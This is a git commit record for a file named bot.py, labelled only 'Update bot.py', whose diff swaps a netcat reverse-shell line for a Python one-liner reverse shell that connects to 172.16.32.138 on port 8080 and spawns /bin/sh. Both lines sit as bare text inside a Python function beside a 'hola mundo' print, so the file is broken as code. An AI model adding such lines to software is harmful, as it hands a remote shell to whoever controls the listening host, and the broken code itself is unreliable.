b93556a8c4f8d2ffc374ea784b82f5fee068ebc6
juanangelLerida <79135620+juanangelLerida@users.noreply.github.com>
2023-03-01 19:39:43 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,3 @@
 def run():
   print('hola mundo')
-  nc -e /bin/sh 172.16.32.138 8080
-
+  python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((" 172.16.32.138",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
